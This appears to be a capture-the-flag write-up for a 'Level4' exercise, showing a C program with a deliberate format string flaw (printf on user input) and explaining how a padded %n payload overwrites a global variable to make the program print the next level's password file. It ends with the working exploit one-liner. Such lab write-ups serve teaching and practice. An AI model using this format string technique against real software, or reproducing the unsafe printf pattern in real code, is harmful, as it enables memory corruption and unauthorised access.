# Level4

## Code
```
#include <stdio.h>
#include <stdlib.h>

int m;

void p(char *buffer)
{
    printf(buffer);
}


void n()
{
    char buffer[512];

    fgets(buffer, 512, stdin);
    p(buffer);
    if (m == 16930116)
    {
        system("/bin/cat /home/user/level5/.pass");
    }
}

int main()
{
    n();
}
```

## Explanation

- This exercise is very similar to the previous one, with fgets and printf.

- So again, we played with the program giving it "AAAA %X %X %X %X %X....." and saw that our buffer was
    located at the 12th jump (it's further because there's one more function call to go through in the
    stack)

- The problem is that this time, we don't have to write "64" at a given address, but a much bigger value,
    0x1025544  (16930116 in decimal).

- So this time, given the size of our buffer, writing as many characters before a %n is out of the
    question. 

- Fortunately, you can give printf specifiers a padding with the syntax %<nbytes>x : so technically,
    even if our buffer is small, we can add as many whitespace characters as we want to reach the desired
    value for %n to write in the memory.

- So let's craft our final payload:

    `python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4`

    + 4 bytes of the address of the variable we need to overwrite
    + the number of whitespaces needed to reach the desired value (16930116 - 4)
    + the final %n to write the number of characters printed so far at the address specified at the
        beginning of our payload. (Notice this syntax allows us to get directly to where the 12th
        argument should be without having to jump with a succession of %x)

- This time, no need to block the terminal with a "cat" command since the program immediately reads the
    .pass file


## Exploit
```
$   python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4
```